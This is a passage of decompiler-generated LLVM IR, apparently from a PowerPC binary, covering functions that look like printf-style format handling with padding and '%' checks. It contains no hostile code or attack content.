  store i32 %v2_10005b4c, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268458840, i32* @lr, align 4
  %v3_10005b54 = call i32 @function_10007210(i32 %v2_10005b4c, i32 %v2_10005b48, i32 128)
  store i32 %v3_10005b54, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005af0

dec_label_pc_10005b60:                            ; preds = %dec_label_pc_100059e4, %dec_label_pc_100059dc, %dec_label_pc_100059c4
  %v0_10005b84.pre41 = phi i32 [ %v1_10005940, %dec_label_pc_100059e4 ], [ 0, %dec_label_pc_100059dc ], [ 5, %dec_label_pc_100059c4 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005b80thread-pre-split

dec_label_pc_10005b68:                            ; preds = %dec_label_pc_10005ae4, %dec_label_pc_10005a44
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000e064.226 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b74

dec_label_pc_10005b74:                            ; preds = %dec_label_pc_10005b04, %dec_label_pc_10005b68
  %v0_10005b8429 = phi i32 [ %v2_10005b08, %dec_label_pc_10005b04 ], [ 6, %dec_label_pc_10005b68 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10005b80

dec_label_pc_10005b80thread-pre-split:            ; preds = %dec_label_pc_10005ab8, %dec_label_pc_10005b14, %dec_label_pc_10005b60, %dec_label_pc_100059e4
  %v1_10005b84.pre = phi i32 [ %v2_100059e8, %dec_label_pc_100059e4 ], [ 0, %dec_label_pc_10005b60 ], [ %v1_10005b84.pre.pre, %dec_label_pc_10005ab8 ], [ 0, %dec_label_pc_10005b14 ]
  %v0_10005b84.pre = phi i32 [ %v1_10005940, %dec_label_pc_100059e4 ], [ %v0_10005b84.pre41, %dec_label_pc_10005b60 ], [ %v0_10005b84.pre.pre, %dec_label_pc_10005ab8 ], [ 1, %dec_label_pc_10005b14 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_100059e4 ], [ %stack_var_-184.0, %dec_label_pc_10005b60 ], [ %v0_10005928, %dec_label_pc_10005ab8 ], [ %v0_10005928, %dec_label_pc_10005b14 ]
  %v0_10005b80.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005b80

dec_label_pc_10005b80:                            ; preds = %dec_label_pc_10005b80thread-pre-split, %dec_label_pc_10005a84, %dec_label_pc_10005b74
  %v1_10005b84 = phi i32 [ %v1_10005b84.pre, %dec_label_pc_10005b80thread-pre-split ], [ 0, %dec_label_pc_10005a84 ], [ 0, %dec_label_pc_10005b74 ]
  %v0_10005b84 = phi i32 [ %v0_10005b84.pre, %dec_label_pc_10005b80thread-pre-split ], [ %v0_10005a74, %dec_label_pc_10005a84 ], [ %v0_10005b8429, %dec_label_pc_10005b74 ]
  %v0_10005b8c = phi i32 [ %v0_10005b80.pr, %dec_label_pc_10005b80thread-pre-split ], [ 11, %dec_label_pc_10005a84 ], [ 11, %dec_label_pc_10005b74 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10005b80thread-pre-split ], [ %v0_10005928, %dec_label_pc_10005a84 ], [ %v0_10005928, %dec_label_pc_10005b74 ]
  %v3_10005b80 = icmp eq i32 %v0_10005b8c, 11
  %v2_10005b84 = add i32 %v0_10005b84, %v1_10005b84
  store i32 %v2_10005b84, i32* %r0.global-to-local, align 4
  br i1 %v3_10005b80, label %dec_label_pc_10005ba0, label %dec_label_pc_10005b8c

dec_label_pc_10005b8c:                            ; preds = %dec_label_pc_10005b80
  %v0_10005b90 = call i32 @__asm_mfcr()
  %v1_10005b94 = call i32 @__asm_rlwinm(i32 %v0_10005b90, i32 30, i32 31, i32 31)
  %v1_10005b98 = add i32 %v1_10005b94, 1
  %v0_10005b9c = load i32, i32* %r0.global-to-local, align 4
  %v2_10005b9c = add i32 %v0_10005b9c, %v1_10005b98
  store i32 %v2_10005b9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005ba0

dec_label_pc_10005ba0:                            ; preds = %dec_label_pc_10005b80, %dec_label_pc_10005b8c
  %v0_10005bb8 = phi i32 [ %v2_10005b84, %dec_label_pc_10005b80 ], [ %v2_10005b9c, %dec_label_pc_10005b8c ]
  %v3_10005ba8 = icmp ugt i32 %tmp, %v0_10005bb8
  br i1 %v3_10005ba8, label %dec_label_pc_10005bb0, label %dec_label_pc_10005bb4

dec_label_pc_10005bb0:                            ; preds = %dec_label_pc_10005ba0
  %v2_10005bb0 = sub i32 %tmp, %v0_10005bb8
  br label %dec_label_pc_10005bb4

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005ba0, %dec_label_pc_10005bb0
  %storemerge96 = phi i32 [ %v2_10005bb0, %dec_label_pc_10005bb0 ], [ 0, %dec_label_pc_10005ba0 ]
  %v1_10005bc4 = phi i32 [ %v2_10005bb0, %dec_label_pc_10005bb0 ], [ 0, %dec_label_pc_10005ba0 ]
  store i32 %storemerge96, i32* @r28, align 4
  %v0_10005bb4 = load i32, i32* @r26, align 4
  %v3_10005bb4 = icmp eq i32 %v0_10005bb4, 48
  %v2_10005bb8 = add i32 %v1_10005bc4, %v0_10005bb8
  store i32 %v2_10005bb8, i32* %r0.global-to-local, align 4
  %v0_10005bbc = load i32, i32* %r23.global-to-local, align 4
  %v2_10005bbc = add i32 %v0_10005bbc, %v2_10005bb8
  store i32 %v2_10005bbc, i32* %r23.global-to-local, align 4
  br i1 %v3_10005bb4, label %dec_label_pc_10005bc4, label %dec_label_pc_10005bcc

dec_label_pc_10005bc4:                            ; preds = %dec_label_pc_10005bb4
  %v0_10005bc4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005bc4 = add i32 %v0_10005bc4, %v1_10005bc4
  store i32 %v2_10005bc4, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005bcc

dec_label_pc_10005bcc:                            ; preds = %dec_label_pc_10005bb4, %dec_label_pc_10005bc4
  %v0_10005be0 = phi i32 [ %v1_10005bc4, %dec_label_pc_10005bb4 ], [ 0, %dec_label_pc_10005bc4 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10005bd0 = and i32 %stack_var_-184.1, 8
  %v3_10005bd0 = icmp eq i32 %v1_10005bd0, 0
  br i1 %v3_10005bd0, label %dec_label_pc_10005bd8, label %dec_label_pc_10005bf4

dec_label_pc_10005bd8:                            ; preds = %dec_label_pc_10005bcc
  %v0_10005bd8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268458984, i32* @lr, align 4
  %v4_10005be4 = call i32 @function_10005598(i32 %v0_10005bd8, i8 32, i32 %v0_10005be0)
  %v1_10005be8 = load i32, i32* @r28, align 4
  %v4_10005be8 = icmp eq i32 %v4_10005be4, %v1_10005be8
  br i1 %v4_10005be8, label %dec_label_pc_10005bf0, label %dec_label_pc_10005ce4

dec_label_pc_10005bf0:                            ; preds = %dec_label_pc_10005bd8
  br label %dec_label_pc_10005bf4

dec_label_pc_10005bf4:                            ; preds = %dec_label_pc_10005bcc, %dec_label_pc_10005bf0
  %v0_10005bf8 = load i32, i32* %r24.global-to-local, align 4
  %v0_10005c00 = load i32, i32* @r27, align 4
  %v2_10005c00 = add i32 %v0_10005c00, ptrtoint (i32* @global_var_1000e06c.227 to i32)
  store i32 268459016, i32* @lr, align 4
  %v2_10005c04 = call i32 @function_10006c74(i32 %v2_10005c00, i32 %v0_10005bf8)
  %v0_10005c10 = load i32, i32* @r29, align 4
  store i32 268459032, i32* @lr, align 4
  %v4_10005c14 = call i32 @function_10005598(i32 %v0_10005bf8, i8 48, i32 %v0_10005c10)
  %v1_10005c18 = load i32, i32* @r29, align 4
  %v4_10005c18 = icmp eq i32 %v4_10005c14, %v1_10005c18
  br i1 %v4_10005c18, label %dec_label_pc_10005c20, label %dec_label_pc_10005ce4

dec_label_pc_10005c20:                            ; preds = %dec_label_pc_10005bf4
  %v3_10005c20 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10005c20, i32* %r0.global-to-local, align 4
  %v3_10005c24 = icmp eq i32 %v3_10005c20, 0
  br i1 %v3_10005c24, label %dec_label_pc_10005c2c, label %dec_label_pc_10005c54

dec_label_pc_10005c2c:                            ; preds = %dec_label_pc_10005c20
  %v0_10005c2c = load i32, i32* @r31, align 4
  %v3_10005c2c = icmp eq i32 %v0_10005c2c, 0
  br i1 %v3_10005c2c, label %dec_label_pc_10005c48.thread, label %dec_label_pc_10005c48

dec_label_pc_10005c48.thread:                     ; preds = %dec_label_pc_10005c2c
  br label %dec_label_pc_10005cb8

dec_label_pc_10005c48:                            ; preds = %dec_label_pc_10005c2c
  %v0_10005c38 = load i32, i32* @r30, align 4
  %v0_10005c40 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459080, i32* @lr, align 4
  %v4_10005c44 = inttoptr i32 %v0_10005c40 to i16*
  %v5_10005c44 = call i32 @function_100097d4(i32 %v0_10005c38, i32 %v0_10005c2c, i16* %v4_10005c44)
  %v1_10005c48.pre = load i32, i32* @r31, align 4
  %v4_10005c48 = icmp eq i32 %v5_10005c44, %v1_10005c48.pre
  br i1 %v4_10005c48, label %dec_label_pc_10005cb8, label %dec_label_pc_10005ce4

dec_label_pc_10005c54:                            ; preds = %dec_label_pc_10005c20
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10005c9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005c9c

dec_label_pc_10005c60:                            ; preds = %dec_label_pc_10005c9c
  %v2_10005cb0 = icmp ugt i32 %v0_10005c60, 128
  %v0_10005c60. = select i1 %v2_10005cb0, i32 128, i32 %v0_10005c60
  store i32 %v0_10005c60., i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10005c70.228 to i32), i32* @lr, align 4
  %v0_10005c6c = call i32 @function_100095b4()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10005c6c, i32* @r30, align 4
  %v3_10005c74 = icmp eq i32 %v0_10005c6c, 0
  br i1 %v3_10005c74, label %dec_label_pc_10005c90, label %dec_label_pc_10005c88

dec_label_pc_10005c88:                            ; preds = %dec_label_pc_10005c60
  %v0_10005c78 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459148, i32* @lr, align 4
  %v3_10005c88 = inttoptr i32 %v0_10005c78 to i16*
  %v4_10005c88 = call i32 @function_100097d4(i32 %v2_10005b48, i32 %v0_10005c6c, i16* %v3_10005c88)
  store i32 %v4_10005c88, i32* %r0.global-to-local, align 4
  %v1_10005c90.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005c90

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005c60, %dec_label_pc_10005c88
  %v1_10005c90 = phi i32 [ 0, %dec_label_pc_10005c60 ], [ %v1_10005c90.pre, %dec_label_pc_10005c88 ]
  %v0_10005c94 = phi i32 [ 0, %dec_label_pc_10005c60 ], [ %v4_10005c88, %dec_label_pc_10005c88 ]
  %v4_10005c90 = icmp eq i32 %v0_10005c94, %v1_10005c90
  %v1_10005c94 = load i32, i32* @r31, align 4
  %v2_10005c94 = sub i32 %v1_10005c94, %v0_10005c94
  store i32 %v2_10005c94, i32* @r31, align 4
  br i1 %v4_10005c90, label %dec_label_pc_10005c9c, label %dec_label_pc_10005ce4

dec_label_pc_10005c9c:                            ; preds = %dec_label_pc_10005c90, %dec_label_pc_10005c54
  %v0_10005c60 = phi i32 [ %v2_10005c94, %dec_label_pc_10005c90 ], [ %v0_10005c9c.pre, %dec_label_pc_10005c54 ]
  %v3_10005c9c = icmp eq i32 %v0_10005c60, 0
  store i32 %v2_10005b48, i32* @r29, align 4
  store i32 %v2_10005a68, i32* @r4, align 4
  store i32 %v2_10005a6c, i32* @r6, align 4
  store i32 %v2_10005b48, i32* @r3, align 4
  br i1 %v3_10005c9c, label %dec_label_pc_10005cb8, label %dec_label_pc_10005c60

dec_label_pc_10005cb8:                            ; preds = %dec_label_pc_10005c9c, %dec_label_pc_10005c48.thread, %dec_label_pc_10005c48
  %v0_10005cb8 = load i32, i32* %r24.global-to-local, align 4
  %v0_10005cc0 = load i32, i32* @r28, align 4
  store i32 268459208, i32* @lr, align 4
  %v4_10005cc4 = call i32 @function_10005598(i32 %v0_10005cb8, i8 32, i32 %v0_10005cc0)
  %v1_10005cc8 = load i32, i32* @r28, align 4
  %v4_10005cc8 = icmp eq i32 %v4_10005cc4, %v1_10005cc8
  br i1 %v4_10005cc8, label %dec_label_pc_10005cd0, label %dec_label_pc_10005ce4

dec_label_pc_10005cd0:                            ; preds = %dec_label_pc_10005cb8, %dec_label_pc_10005a20, %dec_label_pc_100057f8
  %stack_var_-184.2 = phi i32 [ %v0_10005928, %dec_label_pc_100057f8 ], [ %stack_var_-184.1, %dec_label_pc_10005cb8 ], [ %v0_10005928, %dec_label_pc_10005a20 ]
  %v3_10005cd0 = load i8*, i8** %stack_var_-200, align 4
  %v4_10005cd0 = ptrtoint i8* %v3_10005cd0 to i32
  store i32 %v4_10005cd0, i32* @r29, align 4
  br label %dec_label_pc_10005cd4

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_100056f0, %dec_label_pc_10005cd0
  %v0_10005cd4 = phi i32 [ %v0_10005cd4.pre, %dec_label_pc_100056f0 ], [ %v4_10005cd0, %dec_label_pc_10005cd0 ]
  %v0_10005928 = phi i32 [ %tmp56, %dec_label_pc_100056f0 ], [ %stack_var_-184.2, %dec_label_pc_10005cd0 ]
  br label %dec_label_pc_10005708

dec_label_pc_10005ce4:                            ; preds = %dec_label_pc_10005b3c, %dec_label_pc_10005cb8, %dec_label_pc_10005c48, %dec_label_pc_10005bf4, %dec_label_pc_10005bd8, %dec_label_pc_10005a98, %dec_label_pc_10005a68, %dec_label_pc_100059fc, %dec_label_pc_10005744, %dec_label_pc_10005c90
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005ce8

dec_label_pc_10005ce8:                            ; preds = %dec_label_pc_10005750, %dec_label_pc_100056c8, %dec_label_pc_100056e0, %dec_label_pc_10005ce4
  store i32 %v0_1000569c, i32* %r0.global-to-local, align 4
  %v0_10005cec = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10005cec

; uselistorder directives
  uselistorder i32 %v0_10005928, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10005c60, { 2, 1, 0 }
  uselistorder i32 %v1_10005bc4, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10005b54, { 1, 0 }
  uselistorder i32 %v2_10005ae4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10005a44, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10005928, { 1, 0 }
  uselistorder i32 %v6_100058e0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_100058c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100058b0, { 1, 0 }
  uselistorder i32 %v1_10005854, { 1, 0 }
  uselistorder i32 %v0_100057fc, { 1, 0, 2 }
  uselistorder i32 %v1_100057e8, { 1, 0 }
  uselistorder i32 %v0_100057e0, { 1, 0 }
  uselistorder i32 %v1_100057dc, { 1, 0 }
  uselistorder i32 %v1_1000575c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10005724, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10005734, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10005b48, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v4_10005794, { 1, 0 }
  uselistorder i32 %v2_10005790, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1, 8 }
  uselistorder i32* %r10.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32 (i32, i8, i32)* @function_10005598, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4 }
  uselistorder i32 ()* @function_100095b4, { 1, 0 }
  uselistorder label %dec_label_pc_10005ce8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10005ce4, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10005cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10005cb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005c90, { 1, 0 }
  uselistorder label %dec_label_pc_10005bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10005bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10005bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10005ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10005b80, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005b80thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10005b74, { 1, 0 }
  uselistorder label %dec_label_pc_10005b04, { 1, 0 }
  uselistorder label %dec_label_pc_10005af0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a68, { 1, 0 }
  uselistorder label %dec_label_pc_100059b8, { 1, 0 }
  uselistorder label %dec_label_pc_100059a0, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10005950, { 1, 0 }
  uselistorder label %dec_label_pc_10005934, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100058c0, { 1, 0 }
  uselistorder label %dec_label_pc_100058a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005890, { 1, 0 }
  uselistorder label %dec_label_pc_1000588c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005860, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100057ec, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100057b0, { 1, 0 }
  uselistorder label %dec_label_pc_10005750, { 1, 0 }
  uselistorder label %dec_label_pc_10005744, { 1, 0 }
  uselistorder label %dec_label_pc_10005708, { 1, 0 }
}

define i32 @function_10005d00(i32* %arg1) local_unnamed_addr {
dec_label_pc_10005d00:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10005d04 = load i32, i32* @lr, align 4
  store i32 %v0_10005d04, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10005d14 = load i32, i32* @r4, align 4
  store i32 %v0_10005d14, i32* @r30, align 4
  store i32 268459300, i32* @lr, align 4
  %v3_10005d20 = call i32 @function_10006e24(i32 0, i32 160, i32 160)
  %v0_10005d24 = load i32, i32* @r31, align 4
  %v1_10005d24 = add i32 %v0_10005d24, 24
  %v2_10005d24 = inttoptr i32 %v1_10005d24 to i32*
  %v3_10005d24 = load i32, i32* %v2_10005d24, align 4
  store i32 %v3_10005d24, i32* %r9.global-to-local, align 4
  %v1_10005d28 = add i32 %v0_10005d24, 40
  store i32 %v1_10005d28, i32* %r11.global-to-local, align 4
  %v0_10005d2c = load i32, i32* @r30, align 4
  %v2_10005d2c = inttoptr i32 %v0_10005d24 to i32*
  store i32 %v0_10005d2c, i32* %v2_10005d2c, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v0_10005d34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005d34 = add i32 %v0_10005d34, -1
  %v1_10005d38 = load i32, i32* @r31, align 4
  %v2_10005d38 = add i32 %v1_10005d38, 24
  %v3_10005d38 = inttoptr i32 %v2_10005d38 to i32*
  store i32 %v1_10005d34, i32* %v3_10005d38, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v1_10005d44.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005d44

dec_label_pc_10005d44:                            ; preds = %dec_label_pc_10005d44, %dec_label_pc_10005d00
  %v1_10005d44 = phi i32 [ %v1_10005d48, %dec_label_pc_10005d44 ], [ %v1_10005d44.pre, %dec_label_pc_10005d00 ]
  %v0_10005d44 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005d44 = inttoptr i32 %v1_10005d44 to i32*
  store i32 %v0_10005d44, i32* %v2_10005d44, align 4
  %v0_10005d48 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005d48 = add i32 %v0_10005d48, 4
  store i32 %v1_10005d48, i32* %r11.global-to-local, align 4
  %v0_10005d4c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005d4c = add i32 %v0_10005d4c, -1
  store i32 %v1_10005d4c, i32* %ctr.global-to-local, align 4
  %v2_10005d4c = icmp eq i32 %v1_10005d4c, 0
  br i1 %v2_10005d4c, label %dec_label_pc_10005d50, label %dec_label_pc_10005d44

dec_label_pc_10005d50:                            ; preds = %dec_label_pc_10005d44
  %v0_10005d50 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005d90

dec_label_pc_10005d60:                            ; preds = %dec_label_pc_10005d90
  %v3_10005d98 = icmp eq i8 %v2_10005d90, 37
  br i1 %v3_10005d98, label %dec_label_pc_10005d64, label %dec_label_pc_10005d8c

dec_label_pc_10005d64:                            ; preds = %dec_label_pc_10005d60
  %v1_10005d64 = add i32 %v0_10005d64, 1
  %v2_10005d64 = inttoptr i32 %v1_10005d64 to i8*
  %v3_10005d64 = load i8, i8* %v2_10005d64, align 1
  %v4_10005d64 = zext i8 %v3_10005d64 to i32
  store i32 %v4_10005d64, i32* %r0.global-to-local, align 4
  store i32 %v1_10005d64, i32* %r9.global-to-local, align 4
  %v3_10005d6c = icmp eq i8 %v3_10005d64, 37
  br i1 %v3_10005d6c, label %dec_label_pc_10005d8c, label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d64
  %v0_10005d68 = load i32, i32* @r31, align 4
  %v2_10005d74 = inttoptr i32 %v0_10005d68 to i32*
  store i32 %v1_10005d64, i32* %v2_10005d74, align 4
  store i32 268459388, i32* @lr, align 4
  %v1_10005d78 = load i32, i32* %r9.global-to-local, align 4
  %v3_10005d78 = call i32 @function_100060c8(i32* %v2_10005d74, i32 %v1_10005d78)
  %v1_10005d7c = icmp slt i32 %v3_10005d78, 0
  br i1 %v1_10005d7c, label %dec_label_pc_10005da8, label %dec_label_pc_10005d84

dec_label_pc_10005d84:                            ; preds = %dec_label_pc_10005d74
  %v0_10005d84 = load i32, i32* @r31, align 4
  %v1_10005d84 = inttoptr i32 %v0_10005d84 to i32*
  %v2_10005d84 = load i32, i32* %v1_10005d84, align 4
  br label %dec_label_pc_10005d90

dec_label_pc_10005d8c:                            ; preds = %dec_label_pc_10005d60, %dec_label_pc_10005d64
  %v0_10005d8c = phi i32 [ %v0_10005d64, %dec_label_pc_10005d60 ], [ %v1_10005d64, %dec_label_pc_10005d64 ]
  %v1_10005d8c = add i32 %v0_10005d8c, 1
  br label %dec_label_pc_10005d90

dec_label_pc_10005d90:                            ; preds = %dec_label_pc_10005d84, %dec_label_pc_10005d8c, %dec_label_pc_10005d50
  %v0_10005d64 = phi i32 [ %v0_10005d50, %dec_label_pc_10005d50 ], [ %v1_10005d8c, %dec_label_pc_10005d8c ], [ %v2_10005d84, %dec_label_pc_10005d84 ]
  store i32 %v0_10005d64, i32* %r9.global-to-local, align 4
  %v1_10005d90 = inttoptr i32 %v0_10005d64 to i8*
  %v2_10005d90 = load i8, i8* %v1_10005d90, align 1
  %v3_10005d90 = zext i8 %v2_10005d90 to i32
  store i32 %v3_10005d90, i32* %r0.global-to-local, align 4
  %v3_10005d94 = icmp eq i8 %v2_10005d90, 0
  br i1 %v3_10005d94, label %dec_label_pc_10005da0, label %dec_label_pc_10005d60

dec_label_pc_10005da0:                            ; preds = %dec_label_pc_10005d90
  %v0_10005da0 = load i32, i32* @r30, align 4
  %v1_10005da0 = load i32, i32* @r31, align 4
  %v2_10005da0 = inttoptr i32 %v1_10005da0 to i32*
  store i32 %v0_10005da0, i32* %v2_10005da0, align 4
  br label %dec_label_pc_10005da8

dec_label_pc_10005da8:                            ; preds = %dec_label_pc_10005d74, %dec_label_pc_10005da0
  %storemerge = phi i32 [ 0, %dec_label_pc_10005da0 ], [ -1, %dec_label_pc_10005d74 ]
  store i32 %v0_10005d04, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10005d90, { 1, 2, 0 }
  uselistorder i32 %v0_10005d64, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10005d4c, { 1, 0 }
  uselistorder i32 %v1_10005d48, { 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10005da8, { 1, 0 }
  uselistorder label %dec_label_pc_10005d90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005d8c, { 1, 0 }
}

define i32 @function_10005dbc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005dbc:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10005dc0 = load i32, i32* @lr, align 4
  %v0_10005dc4 = load i32, i32* @r3, align 4
  store i32 %v0_10005dc4, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005de0 = add i32 %v0_10005dc4, 24
  %v2_10005de0 = inttoptr i32 %v1_10005de0 to i32*
  %v3_10005de0 = load i32, i32* %v2_10005de0, align 4
  store i32 %v3_10005de0, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10005de0, 1
  br i1 %tmp4, label %dec_label_pc_10005e04, label %dec_label_pc_10005dec

dec_label_pc_10005dec:                            ; preds = %dec_label_pc_10005dbc
  %v2_10005dec = add i32 %v0_10005dc4, 8
  %v3_10005dec = inttoptr i32 %v2_10005dec to i32*
  store i32 0, i32* %v3_10005dec, align 4
  %v0_10005df0 = load i32, i32* @r30, align 4
  %v1_10005df0 = load i32, i32* @r3, align 4
  %v2_10005df0 = add i32 %v1_10005df0, 28
  %v3_10005df0 = inttoptr i32 %v2_10005df0 to i32*
  store i32 %v0_10005df0, i32* %v3_10005df0, align 4
  %v0_10005df4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005df4 = load i32, i32* @r3, align 4
  %v2_10005df4 = add i32 %v1_10005df4, 24
  %v3_10005df4 = inttoptr i32 %v2_10005df4 to i32*
  store i32 %v0_10005df4, i32* %v3_10005df4, align 4
  %v0_10005df8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005df8 = load i32, i32* @r3, align 4
  %v2_10005df8 = add i32 %v1_10005df8, 4
  %v3_10005df8 = inttoptr i32 %v2_10005df8 to i32*
  store i32 %v0_10005df8, i32* %v3_10005df8, align 4
  store i32 268459520, i32* @lr, align 4
  %v0_10005dfc = call i32 @function_10005e18()
  store i32 %v0_10005dfc, i32* %r3.global-to-local, align 4
  %v0_10005e00 = load i32, i32* @r30, align 4
  %v1_10005e00 = load i32, i32* @r31, align 4
  %v2_10005e00 = add i32 %v1_10005e00, 24
  %v3_10005e00 = inttoptr i32 %v2_10005e00 to i32*
  store i32 %v0_10005e00, i32* %v3_10005e00, align 4
  %v0_10005e14.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005e04

dec_label_pc_10005e04:                            ; preds = %dec_label_pc_10005dbc, %dec_label_pc_10005dec
  %v0_10005e14 = phi i32 [ %v0_10005dc4, %dec_label_pc_10005dbc ], [ %v0_10005e14.pre, %dec_label_pc_10005dec ]
  store i32 %v0_10005dc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10005e14

; uselistorder directives
  uselistorder i32 ()* @function_10005e18, { 1, 0 }
  uselistorder label %dec_label_pc_10005e04, { 1, 0 }
}

define i32 @function_10005e18() local_unnamed_addr {
dec_label_pc_10005e18:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
